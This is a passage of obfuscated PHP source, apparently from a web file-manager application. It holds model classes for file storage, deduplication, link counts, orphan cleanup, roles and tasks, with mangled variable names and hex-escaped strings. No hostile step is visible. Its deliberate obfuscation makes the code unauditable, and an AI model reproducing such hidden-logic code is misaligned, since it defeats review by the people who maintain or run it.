(isset($ø±¸êÊÏ[$Á·¢æµ[$‚‰¬£¡‡[2003]]])) { $Á·¢æµ[$‚‰¬£¡‡[2021]] = $ø±¸êÊÏ[$Á·¢æµ[$‚‰¬£¡‡[2003]]]; } } unset($Á·¢æµ); } private function _listAppendUser(&$ïîÆŒÖÚ) { $­Ü«úş =& $_SERVER[´È¥ö†ö]; $Î½Âô€ğ = array_unique(array_to_keyvalue($ïîÆŒÖÚ, $­Ü«úş[12], $­Ü«úş[1773])); $Î½Âô€ğ = array_remove_value($Î½Âô€ğ, $­Ü«úş[230]); if (count($Î½Âô€ğ) == 0) { return; } foreach ($ïîÆŒÖÚ as $—‚ª²ÈÈ) { if (isset($—‚ª²ÈÈ[$­Ü«úş[2021]])) { $Î½Âô€ğ[] = $—‚ª²ÈÈ[$­Ü«úş[2021]][$­Ü«úş[1773]]; } } $Œ“ÄÃñÀ = Model($­Ü«úş[608])->userListInfo($Î½Âô€ğ); foreach ($ïîÆŒÖÚ as &$—‚ª²ÈÈ) { $—‚ª²ÈÈ[$­Ü«úş[676]] = $Œ“ÄÃñÀ[$—‚ª²ÈÈ[$­Ü«úş[1773]]]; if (isset($—‚ª²ÈÈ[$­Ü«úş[2021]])) { $—‚ª²ÈÈ[$­Ü«úş[2021]][$­Ü«úş[676]] = $Œ“ÄÃñÀ[$—‚ª²ÈÈ[$­Ü«úş[2021]][$­Ü«úş[1773]]]; } } unset($—‚ª²ÈÈ); } private function _listAppendMeta(&$ó–ÍÏûÓ) { $š»›ç‚® =& $_SERVER[´È¥ö†ö]; $é±¡„ğà = array_unique(array_to_keyvalue($ó–ÍÏûÓ, $š»›ç‚®[12], $š»›ç‚®[2011])); $é±¡„ğà = array_remove_value($é±¡„ğà, $š»›ç‚®[230]); if (!$é±¡„ğà) { return; } foreach ($ó–ÍÏûÓ as $„İğ•Œ) { if (isset($„İğ•Œ[$š»›ç‚®[2021]])) { $é±¡„ğà[] = $„İğ•Œ[$š»›ç‚®[2021]][$š»›ç‚®[2011]]; } } $ÑÒ¶œ· = $this->metaList($é±¡„ğà); if (!$ÑÒ¶œ·) { return !1; } foreach ($ó–ÍÏûÓ as &$„İğ•Œ) { $„İğ•Œ[$š»›ç‚®[550]] = $ÑÒ¶œ·[$„İğ•Œ[$š»›ç‚®[2011]]]; if (isset($„İğ•Œ[$š»›ç‚®[2021]])) { $„İğ•Œ[$š»›ç‚®[2021]][$š»›ç‚®[550]] = $ÑÒ¶œ·[$„İğ•Œ[$š»›ç‚®[2021]][$š»›ç‚®[2011]]]; } } unset($„İğ•Œ); } private function metaList($ö«×÷À”) { $Ì¡¹ôåü =& $_SERVER[´È¥ö†ö]; if (!$ö«×÷À”) { return array(); } $³Û¡¨Ÿ = array($Ì¡¹ôåü[2011] => array($Ì¡¹ôåü[7], $ö«×÷À”)); $ØĞá«ùŒ = Model($Ì¡¹ôåü[2022])->where($³Û¡¨Ÿ)->select(); $ØĞá«ùŒ = array_to_keyvalue_group($ØĞá«ùŒ, $Ì¡¹ôåü[2011]); foreach ($ØĞá«ùŒ as $‰ŒÆ—Æ => $·«İÔ“ê) { $ØÕóşÄı = array(); foreach ($·«İÔ“ê as $éŠĞÕµÃ) { $ØÕóşÄı[$éŠĞÕµÃ[$Ì¡¹ôåü[97]]] = $éŠĞÕµÃ[$Ì¡¹ôåü[461]]; } $ØĞá«ùŒ[$‰ŒÆ—Æ] = $ØÕóşÄı; } return $ØĞá«ùŒ ? $ØĞá«ùŒ : array(); } public function removeTarget($–úÛ‰¸õ, $šç­Í„¤) { $Æõ×ºàµ =& $_SERVER[´È¥ö†ö]; if (!$šç­Í„¤) { return !0; } $šç­Í„¤ = is_array($šç­Í„¤) ? $šç­Í„¤ : array($šç­Í„¤); $ÃµÒ«ä‹ = array($Æõ×ºàµ[190] => $–úÛ‰¸õ, $Æõ×ºàµ[580] => array($Æõ×ºàµ[7], $šç­Í„¤)); $‚ö‹÷Åô = $this->field($Æõ×ºàµ[2011])->where($ÃµÒ«ä‹)->select(); $¼Š©ò¦– = array_to_keyvalue($‚ö‹÷Åô, $Æõ×ºàµ[12], $Æõ×ºàµ[2011]); if (!$¼Š©ò¦–) { return !0; } $ÃµÒ«ä‹ = array($Æõ×ºàµ[2011] => array($Æõ×ºàµ[7], $¼Š©ò¦–)); $this->where($ÃµÒ«ä‹)->delete(); Model($Æõ×ºàµ[2014])->where($ÃµÒ«ä‹)->delete(); Model($Æõ×ºàµ[2023])->where($ÃµÒ«ä‹)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\x65\x5f\143\x6f\156\164\x65\156\x74\163"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\x54\x69\x6d\x65", "\164\151\155\x65", "\151\156\163\x65\162\x74", "\146\x75\x6e\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\x65"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\155\145" => "\151\157\x5f\x66\x69\x6c\x65\x5f\155\x65\x74\141", "\155\x65\164\x61\x46\x69\145\154\144" => "\146\x69\x6c\x65\x49\104"); public function fileInfo($¯ñğé™ù) { $ÑßÔæ¥ =& $_SERVER[´È¥ö†ö]; static $£ºÔ¡ÙÒ = array(); if (!isset($£ºÔ¡ÙÒ[$¯ñğé™ù])) { $œ¸¢İ£Å = $ÑßÔæ¥[2024]; $ˆú¦¢‰Ø = Model($ÑßÔæ¥[555])->field($œ¸¢İ£Å)->where(array($ÑßÔæ¥[553] => $¯ñğé™ù))->find(); $£ºÔ¡ÙÒ[$¯ñğé™ù] = $ˆú¦¢‰Ø; } return $£ºÔ¡ÙÒ[$¯ñğé™ù]; } public function addFileByContent($¾Î·Ğ È = '', $•Åñ ‡á = '') { $¶şèè©÷ =& $_SERVER[´È¥ö†ö]; $ŞàûĞª² = TEMP_PATH . $¶şèè©÷[2025]; if (!is_dir($ŞàûĞª²)) { mk_dir($ŞàûĞª²); } $œñŞŒ¡Â = $ŞàûĞª² . $¶şèè©÷[2026] . rand_string(16); file_put_contents($œñŞŒ¡Â, $¾Î·Ğ È); $•Š«²İò = $this->addFile($œñŞŒ¡Â, $•Åñ ‡á, !0); if (file_exists($œñŞŒ¡Â)) { @unlink($œñŞŒ¡Â); } return $•Š«²İò; } public function createFileName($’ƒ‡ÛÙû, $¸»©ôÙŞ = false, $ïüãˆı = false) { $²Â½†Ã€ =& $_SERVER[´È¥ö†ö]; $´Ù“ıï = IO::init($²Â½†Ã€[8]); $æŒÀáÎ† = $this->makeFilePath($’ƒ‡ÛÙû, $´Ù“ıï, $¸»©ôÙŞ, $ïüãˆı); $ ÈıÄÀè = $´Ù“ıï->pathFather($æŒÀáÎ†); static $ë·ìÆø‰ = false; $ê’¥Á½Ü = $²Â½†Ã€[2027] . md5($ ÈıÄÀè); if (!$ë·ìÆø‰ && !Cache::get($ê’¥Á½Ü)) { $ë·ìÆø‰ = !0; $¸¹ê§¾á = IO::mkdir($ ÈıÄÀè); if (!IO::exist($¸¹ê§¾á . $²Â½†Ã€[874])) { IO::mkfile($¸¹ê§¾á . $²Â½†Ã€[874]); } Cache::set($ê’¥Á½Ü, 1, 3600 * 2); } return $æŒÀáÎ†; } public function makeFilePath($Ãşë÷â°, $¦‹…’å´, $™›¯«¶ = false, $¸ßª£¬æ = false) { $ú„›¡É– =& $_SERVER[´È¥ö†ö]; $Ñ²‚©À = Model($ú„›¡É–[846])->get($ú„›¡É–[2028]); $Ø­½· ‚ = KodIO::defaultIO() . date($ú„›¡É–[2029]); $×íšÆâ = $Ø­½· ‚ . rand_string(5) . short_id(100); $Ãşë÷â° = str_replace($ú„›¡É–[8], $ú„›¡É–[11], KodIO::clear($Ãşë÷â°)); $¡ñÎØÅ = $¦‹…’å´->ext($Ãşë÷â°); if (!$Ãşë÷â°) { $Ñ²‚©À = $ú„›¡É–[852]; } switch ($Ñ²‚©À) { case $ú„›¡É–[2030]: if ($¡ñÎØÅ) { $×íšÆâ = $×íšÆâ . $ú„›¡É–[10] . $¡ñÎØÅ; } if ($¡ñÎØÅ == $ú„›¡É–[1966]) { $×íšÆâ .= $ú„›¡É–[1290]; } break; case $ú„›¡É–[2031]: $ø¹åÜ = Model($ú„›¡É–[846])->get($ú„›¡É–[847]); $Ş÷áóøÛ = substr(md5($ú„›¡É–[848] . $ø¹åÜ . date($ú„›¡É–[825])), 0, 8); $’ıİ‡Ìè = KodIO::defaultDriver(); $Ø­½· ‚ = $ú„›¡É–[1321] . $’ıİ‡Ìè[$ú„›¡É–[486]] . $ú„›¡É–[495] . date($ú„›¡É–[2032]) . $Ş÷áóøÛ . $ú„›¡É–[8]; if ($¡ñÎØÅ == $ú„›¡É–[1966]) { $Ãşë÷â° .= $ú„›¡É–[1290]; } $éÜÃ–ƒõ = $ú„›¡É–[2033] . $Ø­½· ‚ . $Ãşë÷â°; CacheLock::lock($éÜÃ–ƒõ); $×íšÆâ = $Ø­½· ‚ . $Ãşë÷â°; if (IO::exist($Ø­½· ‚ . $Ãşë÷â°)) { $†±Ø—¬ã = substr($Ãşë÷â°, 0, strlen($Ãşë÷â°) - strlen($¡ñÎØÅ)); $©ÔàêÍÔ = $¸ßª£¬æ ? substr($¸ßª£¬æ, 0, 5) : ($™›¯«¶ ? substr($™›¯«¶, 0, 5) : rand_string(5)); $×íšÆâ = $Ø­½· ‚ . $†±Ø—¬ã . $©ÔàêÍÔ; if ($¡ñÎØÅ) { $×íšÆâ = $×íšÆâ . $ú„›¡É–[10] . $¡ñÎØÅ; } } if (IO::isOsDriver($×íšÆâ) && !IO::isUploadServer($×íšÆâ)) { if (IO::exist($×íšÆâ)) { CacheLock::unlock($éÜÃ–ƒõ); return $×íšÆâ; } $†ÏµÙ = IO::setContent($×íšÆâ, $ú„›¡É–[12]); if (!$†ÏµÙ) { show_json($ú„›¡É–[2034], !1); } } CacheLock::unlock($éÜÃ–ƒõ); break; case $ú„›¡É–[852]: break; default: break; } return $×íšÆâ; } public function addFileByRemote($ßò™êş, $¨š¨Œê, $—‚ñá–‹ = array()) { $Šœ¡œìÎ =& $_SERVER[´È¥ö†ö]; if (!IO::exist($ßò™êş)) { return !1; } $õóò™‡Ğ = $—‚ñá–‹[$Šœ¡œìÎ[558]] ? $—‚ñá–‹[$Šœ¡œìÎ[558]] : $Šœ¡œìÎ[12]; $¥ÎœÊ´¸ = IO::hashMd5($ßò™êş, $õóò™‡Ğ); $Ä—ğö©ş = KodIO::defaultDriver(); $‚®‘çš™ = array($Šœ¡œìÎ[631] => IO::size($ßò™êş), $Šœ¡œìÎ[2035] => 1, $Šœ¡œìÎ[505] => $¨š¨Œê, $Šœ¡œìÎ[885] => $Ä—ğö©ş[$Šœ¡œìÎ[486]], $Šœ¡œìÎ[506] => $ßò™êş, $Šœ¡œìÎ[2036] => $—‚ñá–‹[$Šœ¡œìÎ[686]] ? $—‚ñá–‹[$Šœ¡œìÎ[686]] : IO::hashSimple($ßò™êş), $Šœ¡œìÎ[2037] => $¥ÎœÊ´¸ ? $¥ÎœÊ´¸ : $õóò™‡Ğ); if ($¯×µ“‹Ù = $this->addFileCheckExist($‚®‘çš™[$Šœ¡œìÎ[686]], $‚®‘çš™[$Šœ¡œìÎ[558]], $‚®‘çš™[$Šœ¡œìÎ[79]])) { return $¯×µ“‹Ù; } return $this->addFileData($‚®‘çš™); } private function addFileData($°ˆèµƒ…) { $ÈÊûÖŞà =& $_SERVER[´È¥ö†ö]; if (!$°ˆèµƒ…) { return !1; } $°ˆèµƒ…[$ÈÊûÖŞà[79]] = intval($°ˆèµƒ…[$ÈÊûÖŞà[79]]); if (!$°ˆèµƒ…[$ÈÊûÖŞà[79]] && strlen($°ˆèµƒ…[$ÈÊûÖŞà[686]]) > 32) { $°ˆèµƒ…[$ÈÊûÖŞà[79]] = intval(substr($°ˆèµƒ…[$ÈÊûÖŞà[686]], 32)); } $õ¨¶Óø¨ = $this->add($°ˆèµƒ…); return $this->find($õ¨¶Óø¨); } public function addFile($”–şñ¡ø, $òÆğÙ‹°, $×êŒ›î¤ = false) { $¢×³º²ù =& $_SERVER[´È¥ö†ö]; $Î¶÷†ùÚ = IO::hashSimple($”–şñ¡ø); $ÈÂ¿‰›À = IO::size($”–şñ¡ø); $èĞ¸ÊıÈ = $ÈÂ¿‰›À <= 1024 * 1024 * 10 ? IO::hashMd5($”–şñ¡ø) : $¢×³º²ù[12]; $×£Ç’ë³ = $¢×³º²ù[2038] . $Î¶÷†ùÚ; CacheLock::lock($×£Ç’ë³); if ($èĞ¸ÊıÈ && $Î¶÷†ùÚ) { $øñØÇ³á = $this->addFileCheckExist($Î¶÷†ùÚ, $èĞ¸ÊıÈ, $ÈÂ¿‰›À); if ($øñØÇ³á) { CacheLock::unlock($×£Ç’ë³); return $øñØÇ³á; } } $ºç÷ô™¥ = $this->addFileMake($”–şñ¡ø, $ÈÂ¿‰›À, $Î¶÷†ùÚ, $èĞ¸ÊıÈ, $òÆğÙ‹°, $×êŒ›î¤); $–öÜõˆ = $this->addFileData($ºç÷ô™¥); CacheLock::unlock($×£Ç’ë³); if (!$èĞ¸ÊıÈ && $–öÜõˆ) { $this->fileMd5Check($–öÜõˆ); } return $–öÜõˆ; } public function fileMd5Check($ºû³Å£) { $®ßëÔ‘¿ =& $_SERVER[´È¥ö†ö]; $û¿è¥´ = array($ºû³Å£[$®ßëÔ‘¿[552]], $ºû³Å£[$®ßëÔ‘¿[87]]); $“ŸöŠÀ¹ = $®ßëÔ‘¿[2039] . $ºû³Å£[$®ßëÔ‘¿[87]]; $ÊÓ¬Ÿà¦ = $®ßëÔ‘¿[2040] . $ºû³Å£[$®ßëÔ‘¿[552]]; TaskQueue::add($®ßëÔ‘¿[2041], $û¿è¥´, $“ŸöŠÀ¹, $ÊÓ¬Ÿà¦); } public function fileMd5Set($¸·¡òş, $«½Œº®è) { $­‹ØÔ‡Ğ =& $_SERVER[´È¥ö†ö]; $Ô›¤ãÜÃ = $this->find($¸·¡òş); if (!$Ô›¤ãÜÃ || $Ô›¤ãÜÃ[$­‹ØÔ‡Ğ[558]]) { return; } $ŒØşâ™ = IO::hashMd5($«½Œº®è); if (!$ŒØşâ™) { return $­‹ØÔ‡Ğ[12]; } $this->where(array($­‹ØÔ‡Ğ[552] => $¸·¡òş))->save(array($­‹ØÔ‡Ğ[558] => $ŒØşâ™)); } public function addFileMake($Ô£¡ûŞÕ, $–åØÓˆÜ, $Ñƒüì€Î, $äøÒ¾§Â, $äµ×ÔÄò, $óìè””) { $üºåËå» =& $_SERVER[´È¥ö†ö]; $’øÔ¬Ëî = $this->createFileName($äµ×ÔÄò, $Ñƒüì€Î, $äøÒ¾§Â); $—Ÿíô¯† = get_path_father($’øÔ¬Ëî); $òäÇ´ôô = get_path_this($’øÔ¬Ëî); if ($óìè””) { $öò“û¹ = IO::move($Ô£¡ûŞÕ, $—Ÿíô¯†, !1, $òäÇ´ôô); } else { $öò“û¹ = IO::copy($Ô£¡ûŞÕ, $—Ÿíô¯†, !1, $òäÇ´ôô); } if (!$öò“û¹) { return !1; } $«›‹íƒ = KodIO::defaultDriver(); $ÓóŠåÏ = array($üºåËå»[631] => $–åØÓˆÜ, $üºåËå»[2035] => 1, $üºåËå»[505] => $äµ×ÔÄò, $üºåËå»[885] => $«›‹íƒ[$üºåËå»[486]], $üºåËå»[506] => $’øÔ¬Ëî, $üºåËå»[2036] => $Ñƒüì€Î, $üºåËå»[2037] => $äøÒ¾§Â); return $ÓóŠåÏ; } public function addFileCheckExist($ô¤Şï³‡, $ÇËÂ™ÏŒ, $µÕ©±‡µ) { $³šÁêİ =& $_SERVER[´È¥ö†ö]; $È™¼Òï» = $this->findByHash($ô¤Şï³‡, $ÇËÂ™ÏŒ); if (!$È™¼Òï») { return !1; } $®¹õÃ°› = array($³šÁêİ[2035] => intval($È™¼Òï»[$³šÁêİ[2042]]) + 1, $³šÁêİ[631] => $µÕ©±‡µ); $this->where(array($³šÁêİ[553] => $È™¼Òï»[$³šÁêİ[552]]))->save($®¹õÃ°›); return $È™¼Òï»; } public function remove($âŠŞÎ ) { $this->linkCountChange($âŠŞÎ , !1); $this->clearEmpty(); return !0; } public function linkAdd($âÀ¸öÁÆ) { $this->linkCountChange($âÀ¸öÁÆ, !0); } public function linkCountChange($›ÏŠëî, $Ä¥™Èü×) { $šÌÔ„ =& $_SERVER[´È¥ö†ö]; if (!$›ÏŠëî) { return; } if (!is_array($›ÏŠëî)) { $›ÏŠëî = array($›ÏŠëî); } $ûïÀú…‹ = array(); foreach ($›ÏŠëî as $Ÿæé­§Ù) { $ˆ³‡ú‡ = $Ÿæé­§Ù . $šÌÔ„[12]; if (!$ûïÀú…‹[$ˆ³‡ú‡]) { $ûïÀú…‹[$ˆ³‡ú‡] = 0; } $ûïÀú…‹[$ˆ³‡ú‡]++; } $Ãå¨Ô¦å = array(); foreach ($ûïÀú…‹ as $Ÿæé­§Ù => $¡»êÈÅş) { $ˆ³‡ú‡ = $¡»êÈÅş . $šÌÔ„[12]; if (!$Ãå¨Ô¦å[$ˆ³‡ú‡]) { $Ãå¨Ô¦å[$ˆ³‡ú‡] = array(); } $Ãå¨Ô¦å[$ˆ³‡ú‡][] = $Ÿæé­§Ù; } foreach ($Ãå¨Ô¦å as $¡»êÈÅş => $ÕŸß×±«) { if (!$ÕŸß×±«) { continue; } $¡»êÈÅş = $Ä¥™Èü× ? $¡»êÈÅş : -intval($¡»êÈÅş); $Â×®¬ş = array($šÌÔ„[552] => array($šÌÔ„[7], $ÕŸß×±«)); if ($¡»êÈÅş < 0) { $Â×®¬ş[$šÌÔ„[2042]] = array($šÌÔ„[1091], abs($¡»êÈÅş)); } $this->where($Â×®¬ş)->setAdd($šÌÔ„[2042], $¡»êÈÅş); } } public function findByHash($ÁµĞ™Úù, $µ“Î×áÍ = false) { $—¨¿±ú„ =& $_SERVER[´È¥ö†ö]; if (!$ÁµĞ™Úù && !$µ“Î×áÍ) { return !1; } $Öû÷ÒÌä = array($—¨¿±ú„[2036] => $ÁµĞ™Úù); if ($µ“Î×áÍ) { $Öû÷ÒÌä = array($—¨¿±ú„[2037] => $µ“Î×áÍ); } return $this->order($—¨¿±ú„[2043])->where($Öû÷ÒÌä)->find(); } public function clearEmpty($¯¹‚š÷ç = 1) { $Ò‰¾Ã˜Ü =& $_SERVER[´È¥ö†ö]; $—ïÄåÁ = time() - 3600 * 24 * $¯¹‚š÷ç; $ÕŸÜ²í = $Ò‰¾Ã˜Ü[2044] . $—ïÄåÁ; $ÚÎé¢äñ = $this->where($ÕŸÜ²í)->select(); if (!$ÚÎé¢äñ) { return; } $Ÿ‰Şùî› = new Task($Ò‰¾Ã˜Ü[2045], $Ò‰¾Ã˜Ü[12], count($ÚÎé¢äñ)); foreach ($ÚÎé¢äñ as $‰‚ÁËò¡) { $Ÿ‰Şùî›->update(1); $this->resetFile($‰‚ÁËò¡); } $Ÿ‰Şùî›->end(); } public function resetFile($½Û™§‘Æ) { $¡²íˆÉí =& $_SERVER[´È¥ö†ö]; $¤ààúŠû = array($¡²íˆÉí[553] => $½Û™§‘Æ[$¡²íˆÉí[552]]); $ùê£º… = Model($¡²íˆÉí[1420])->where($¤ààúŠû)->count(); $âİ¨©î¦ = Model($¡²íˆÉí[2046])->where($¤ààúŠû)->count(); $êıçÕïí = intval($ùê£º…) + intval($âİ¨©î¦); if ($êıçÕïí == 0) { IO::remove($½Û™§‘Æ[$¡²íˆÉí[87]]); Model($¡²íˆÉí[2047])->delete($½Û™§‘Æ[$¡²íˆÉí[552]]); $this->where($¤ààúŠû)->delete(); $this->metaSet($½Û™§‘Æ[$¡²íˆÉí[552]], null, null); write_log(ACTION . $¡²íˆÉí[2048] . KodUser::id() . $¡²íˆÉí[2049] . $½Û™§‘Æ[$¡²íˆÉí[552]] . $¡²íˆÉí[2050] . $½Û™§‘Æ[$¡²íˆÉí[79]] . $¡²íˆÉí[201] . $½Û™§‘Æ[$¡²íˆÉí[87]], $¡²íˆÉí[2051]); return; } if ($½Û™§‘Æ[$¡²íˆÉí[2042]] != $êıçÕïí) { $this->where($¤ààúŠû)->save(array($¡²íˆÉí[2035] => $êıçÕïí)); } } public function storageInfo($„“×˜ÙØ = false) { $ù–È½Õú =& $_SERVER[´È¥ö†ö]; $œñÜó„Í = $this->count() + 0.0; $ğ…›¢¦ú = 0; $ñûÛ¶ğ¬ = 1; $ “Ú‹îÌ = 0; $¾¼ßàìŠ = 5000; for ($Š¦Ş»ª· = 0; $Š¦Ş»ª· < $œñÜó„Í; $Š¦Ş»ª· = $Š¦Ş»ª· + $¾¼ßàìŠ) { $£œç­¬í = $this->limit($Š¦Ş»ª·, $Š¦Ş»ª· + $¾¼ßàìŠ)->select(); foreach ($£œç­¬í as $àŠ„ç›Ÿ) { $ñûÛ¶ğ¬ += $àŠ„ç›Ÿ[$ù–È½Õú[79]] * $àŠ„ç›Ÿ[$ù–È½Õú[2042]]; $ğ…›¢¦ú += $àŠ„ç›Ÿ[$ù–È½Õú[79]] * ($àŠ„ç›Ÿ[$ù–È½Õú[2042]] - 1); $ “Ú‹îÌ += $àŠ„ç›Ÿ[$ù–È½Õú[2042]]; } } $Àõ÷™å› = array($ù–È½Õú[2052] => $ñûÛ¶ğ¬, $ù–È½Õú[2053] => $ğ…›¢¦ú, $ù–È½Õú[2054] => $ğ…›¢¦ú / $ñûÛ¶ğ¬, $ù–È½Õú[83] => $œñÜó„Í, $ù–È½Õú[2055] => $ “Ú‹îÌ); return $Àõ÷™å›; } } goto CÔ¾„¥¨ô; eİ¼®Å‹â®: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\162\157\154\x65\114\x69\x73\164"; public $field = array("\x6e\141\155\145", "\141\x75\164\x68", "\x6c\141\142\145\x6c", "\144\151\x73\x70\154\141\171", "\x73\x79\163\x74\145\x6d", "\144\145\163\143", "\x69\147\156\157\x72\145\x45\170\164", "\151\x67\156\x6f\162\x65\x46\151\x6c\x65\x53\151\x7a\x65", "\141\144\x6d\151\x6e\151\163\164\x72\x61\164\x6f\162", "\163\x6f\162\x74"); public function listData($¥óÈÇ‚Í = false, $õŸ ÃŸõ = "\163\x6f\162\x74", $æ®ÇÜŒ® = false) { $¨¥†È‰à =& $_SERVER[´È¥ö†ö]; $ßˆ‡²úÄ = parent::listData($¥óÈÇ‚Í, $õŸ ÃŸõ, $æ®ÇÜŒ®); if (!$¥óÈÇ‚Í) { foreach ($ßˆ‡²úÄ as $µ«ì×ıí => $å³»ãôû) { if ($å³»ãôû[$¨¥†È‰à[2182]] == 1) { $ßˆ‡²úÄ[$µ«ì×ıí][$¨¥†È‰à[537]] = LNG($¨¥†È‰à[2451]); } } } return $ßˆ‡²úÄ; } public function update($«ù·ö§Ô, $È˜„£ÖÄ) { $Ë÷×–¡• =& $_SERVER[´È¥ö†ö]; $Şèë® = parent::listData($«ù·ö§Ô); $ˆ¢×Áéó = $this->findByName($È˜„£ÖÄ[$Ë÷×–¡•[32]]); if (!$Şèë® || $ˆ¢×Áéó && $ˆ¢×Áéó[$Ë÷×–¡•[486]] != $Şèë®[$Ë÷×–¡•[486]]) { return !1; } if ($ˆ¢×Áéó[$Ë÷×–¡•[2182]] == 1) { $È˜„£ÖÄ = array($Ë÷×–¡•[32] => $È˜„£ÖÄ[$Ë÷×–¡•[32]], $Ë÷×–¡•[1997] => $È˜„£ÖÄ[$Ë÷×–¡•[1997]]); } $this->filterAuth($È˜„£ÖÄ[$Ë÷×–¡•[498]]); return parent::update($«ù·ö§Ô, $È˜„£ÖÄ); } public function remove($ûõÌğì) { $»€¶»ã” = parent::listData($ûõÌğì); if (!$»€¶»ã” || $»€¶»ã”[$_SERVER[´È¥ö†ö][191]]) { return !1; } return parent::remove($ûõÌğì); } public function add($ÕĞãš­›) { $€Ï‡ÌãÍ =& $_SERVER[´È¥ö†ö]; $å”Í©ÙÈ = $ÕĞãš­›[$€Ï‡ÌãÍ[32]]; if ($this->findByName($å”Í©ÙÈ)) { return !1; } $óßÂœŞ = array($€Ï‡ÌãÍ[505] => $å”Í©ÙÈ, $€Ï‡ÌãÍ[1980] => $€Ï‡ÌãÍ[12], $€Ï‡ÌãÍ[1976] => $€Ï‡ÌãÍ[1984], $€Ï‡ÌãÍ[2452] => 1, $€Ï‡ÌãÍ[1979] => 0, $€Ï‡ÌãÍ[2453] => 0, $€Ï‡ÌãÍ[1978] => $this->getSort()); $ÕĞãš­› = array_merge($óßÂœŞ, $ÕĞãš­›); $this->filterAuth($ÕĞãš­›[$€Ï‡ÌãÍ[498]]); return parent::insert($ÕĞãš­›); } private function getSort() { $´Ÿ‡†½õ =& $_SERVER[´È¥ö†ö]; $¿÷Õ²æ· = parent::listData(); $áÃõöÙÕ = array_to_keyvalue($¿÷Õ²æ·, $´Ÿ‡†½õ[12], $´Ÿ‡†½õ[1998]); return empty($áÃõöÙÕ) ? 0 : max($áÃõöÙÕ) + 1; } private function filterAuth(&$¤öúÁ³Ğ) { $§âŸÑ¡ =& $_SERVER[´È¥ö†ö]; $«–Æ‚° = array(); $¾šŸïØ = array_filter(explode($§âŸÑ¡[50], $¤öúÁ³Ğ)); foreach ($¾šŸïØ as $¤öúÁ³Ğ) { $é–‰À¨ë = explode($§âŸÑ¡[10], $¤öúÁ³Ğ); if ($é–‰À¨ë[0] == $§âŸÑ¡[2454] && $é–‰À¨ë[1] != $§âŸÑ¡[1274]) { $€˜´ûÃÚ = $é–‰À¨ë[0] . $§âŸÑ¡[10] . $é–‰À¨ë[1] . $§âŸÑ¡[2455]; if (!in_array($€˜´ûÃÚ, $¾šŸïØ)) { $«–Æ‚°[] = $€˜´ûÃÚ; } } $«–Æ‚°[] = $¤öúÁ³Ğ; } $¤öúÁ³Ğ = implode($§âŸÑ¡[50], $«–Æ‚°); } public function findRoleDefault() { $§‹ƒ„¿± =& $_SERVER[´È¥ö†ö]; $ ÚÑğá½ = parent::listData(); $úßÇƒ‡Ú = !1; foreach ($ ÚÑğá½ as $Ìš£»óÉ) { if (!$Ìš£»óÉ || $Ìš£»óÉ[$§‹ƒ„¿±[1996]] == $§‹ƒ„¿±[230] || $Ìš£»óÉ[$§‹ƒ„¿±[2182]] == 1) { continue; } if (strstr($Ìš£»óÉ[$§‹ƒ„¿±[498]], $§‹ƒ„¿±[2456])) { continue; } if (!strstr($Ìš£»óÉ[$§‹ƒ„¿±[498]], $§‹ƒ„¿±[2457])) { continue; } if (!$úßÇƒ‡Ú) { $úßÇƒ‡Ú = $Ìš£»óÉ; continue; } $‘¥ƒË¦ = explode($§‹ƒ„¿±[50], $úßÇƒ‡Ú[$§‹ƒ„¿±[498]]); $ò«ÒÆıÍ = explode($§‹ƒ„¿±[50], $Ìš£»óÉ[$§‹ƒ„¿±[498]]); if (count($‘¥ƒË¦) > count($ò«ÒÆıÍ)) { $úßÇƒ‡Ú = $Ìš£»óÉ; } } return $úßÇƒ‡Ú ? $úßÇƒ‡Ú[$§‹ƒ„¿±[486]] : $§‹ƒ„¿±[12]; } public function sort($ğŒØ— É, $–«ôÓ¢è) { return parent::update($ğŒØ— É, $–«ôÓ¢è); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\164\x61\x73\x6b\114\x69\x73\x74"; public $field = array("\156\141\155\145", "\x74\171\x70\145", "\x65\x76\x65\156\164", "\x74\151\x6d\145", "\144\145\163\x63", "\163\171\163\164\x65\155", "\145\156\141\x62\154\x65", "\154\x61\x73\164\x52\165\x6e", "\163\x6f\162\164"); public function listData($¢§¿ˆ— = false, $°’ÀÃ¢ = "\163\157\162\x74", $È¸ÄË¡Ç = false) { return parent::listData($¢§¿ˆ—, $°’ÀÃ¢, $È¸ÄË¡Ç); } public function add($Ì®ş¦óü) { $²å¨ÂÁ‚ =& $_SERVER[´È¥ö†ö]; $Ÿ’³ôĞµ = $this->findByName($Ì®ş¦óü[$²å¨ÂÁ‚[32]]); if ($Ÿ’³ôĞµ) { return !1; } $Ì®ş¦óü[$²å¨ÂÁ‚[1723]] = 0; $Ì®ş¦óü[$²å¨ÂÁ‚[1998]] = $this->getSort(); return parent::insert($Ì®ş¦óü); } private function getSort() { $”µÄ¡‰¤ =& $_SERVER[´È¥ö†ö]; $€–Ú”Š = parent::listData(); $î”şëŸ = array_to_keyvalue($€–Ú”Š, $”µÄ¡‰¤[12], $”µÄ¡‰¤[1998]); return empty($î”şëŸ) ? 0 : max($î”şëŸ) + 1; } public function update($ªùŒŠ, $Ã„‹ªÒ›) { $äÅìâÙâ =& $_SERVER[´È¥ö†ö]; $×âîßÃˆ = $this->listData($ªùŒŠ); $Ï¯ùÔ™² = $this->findByName($Ã„‹ªÒ›[$äÅìâÙâ[32]]); if (!$×âîßÃˆ || $Ï¯ùÔ™² && $Ï¯ùÔ™²[$äÅìâÙâ[486]] != $×âîßÃˆ[$äÅìâÙâ[486]]) { return !1; } return parent::update($ªùŒŠ, $Ã„‹ªÒ›); } public function remove($ü±Ä•ÙÍ, $úö´·Ò = false) { $³ÇÖûŞª =& $_SERVER[´È¥ö†ö]; $ÕÄ®ˆÁ = $this->listData($ü±Ä•ÙÍ); if (!$ÕÄ®ˆÁ) { return; } if (!$úö´·Ò && $ÕÄ®ˆÁ[$³ÇÖûŞª[191]] == $³ÇÖûŞª[91]) { return !1; } return parent::remove($ü±Ä•ÙÍ); } public function enable($Íèš…¨­, $„µº¯ı—) { return $this->update($Íèš…¨­, array($_SERVER[´È¥ö†ö][2446] => $„µº¯ı—)); } public function run($äß¥á¬) { return $this->update($äß¥á¬, array($_SERVER[´È¥ö†ö][2458] => time())); } } class UserFavModel extends ModelBase { protected $tableName = 